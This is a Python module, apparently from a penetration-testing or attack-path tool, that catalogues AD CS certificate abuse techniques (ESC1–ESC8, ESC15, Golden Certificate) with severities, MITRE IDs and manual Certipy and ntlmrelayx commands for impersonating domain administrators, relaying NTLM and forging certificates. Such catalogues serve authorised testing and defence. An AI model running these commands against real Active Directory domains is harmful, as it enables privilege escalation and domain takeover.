from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class EscTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "adcs_esc"


ESC_TECHNIQUES: dict[str, EscTechnique] = {
    "esc1": EscTechnique(
        key="esc1",
        title="ESC1 — Enrollee supplies subject",
        severity="critical",
        mitre_id="T1649",
        summary="Template allows requesting a cert for arbitrary SAN + client authentication EKU.",
        manual_commands=(
            "certipy req -u user@corp.local -p pass -ca <CA> -template <Template> "
            "-upn administrator@corp.local",
            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
        ),
    ),
    "esc2": EscTechnique(
        key="esc2",
        title="ESC2 — Any Purpose EKU",
        severity="critical",
        mitre_id="T1649",
        summary="Template has Any Purpose EKU (or no EKU) with enrollment rights.",
        manual_commands=("certipy req ... -template <Template>", "certipy auth -pfx ..."),
    ),
    "esc3": EscTechnique(
        key="esc3",
        title="ESC3 — Certificate Request Agent",
        severity="high",
        mitre_id="T1649",
        summary="Enrollment agent template + victim template chain for impersonation.",
        manual_commands=(
            "certipy req -template <AgentTemplate> -ca <CA>",
            "certipy req -template <VictimTemplate> -on-behalf-of <user> -pfx agent.pfx",
        ),
    ),
    "esc4": EscTechnique(
        key="esc4",
        title="ESC4 — Vulnerable template ACL",
        severity="high",
        mitre_id="T1649",
        summary="Write access on certificate template enables ESC1-style abuse.",
        manual_commands=(
            "certipy template -u user@corp.local -hashes :<NTLM> -template <Template> -save-old",
            "certipy template -u user@corp.local -hashes :<NTLM> -template <Template> -add-client-auth",
            "certipy req -ca <CA> -template <Template> -upn administrator@corp.local",
            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
        ),
    ),
    "esc6": EscTechnique(
        key="esc6",
        title="ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2",
        severity="critical",
        mitre_id="T1649",
        summary="CA allows requester to specify SAN in any template issued by this CA.",
        manual_commands=(
            "certipy req -u user -p pass -ca <CA> -template User "
            "-upn administrator@corp.local",
        ),
    ),
    "esc7": EscTechnique(
        key="esc7",
        title="ESC7 — Vulnerable CA ACL",
        severity="high",
        mitre_id="T1649",
        summary="ManageCA / ManageCertificates on CA enables template or cert abuse.",
        manual_commands=("certipy ca -ca <CA> -enable-template <Template>",),
    ),
    "esc8": EscTechnique(
        key="esc8",
        title="ESC8 — NTLM relay to HTTP enrollment",
        severity="critical",
        mitre_id="T1649",
        summary="Web enrollment accepts NTLM — relay to /certsrv/certfnsh.asp.",
        manual_commands=(
            "ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template <Template>",
            "coerce authentication to relay listener",
        ),
    ),
    "esc15": EscTechnique(
        key="esc15",
        title="ESC15 — Arbitrary application policy",
        severity="high",
        mitre_id="T1649",
        summary="Schema v2 template with arbitrary application policy OID.",
        manual_commands=("certipy req ... -application-policies 1.3.6.1.5.5.7.3.2",),
    ),
    "golden_cert": EscTechnique(
        key="golden_cert",
        title="Golden Certificate",
        severity="critical",
        mitre_id="T1649",
        summary="Forge TGTs with stolen CA private key (NTAUTH certificate).",
        manual_commands=(
            "certipy ca -backup -ca <CA>",
            "certipy forge -ca-pfx ca.pfx -upn administrator@corp.local",
        ),
        guide_key="golden_cert",
    ),
    "template_enrollment": EscTechnique(
        key="template_enrollment",
        title="Restricted template enrollment",
        severity="high",
        mitre_id="T1649",
        summary="Owned principal can enroll in a non-default template (e.g. via group membership).",
        manual_commands=(
            "certipy find -u user@corp.local -hashes :<NTLM> -dc-ip <DC> -vulnerable",
            "certipy req -u user@corp.local -hashes :<NTLM> -ca <CA> -template <Template> -dns <target>",
            "certipy auth -pfx <host>.pfx -dc-ip <DC>",
        ),
    ),
}


def esc_meta(key: str) -> EscTechnique:
    return ESC_TECHNIQUES.get(
        key,
        EscTechnique(
            key=key,
            title=key.upper(),
            severity="medium",
            mitre_id="T1649",
            summary=f"AD CS technique {key}",
            manual_commands=("guide adcs_esc",),
        ),
    )
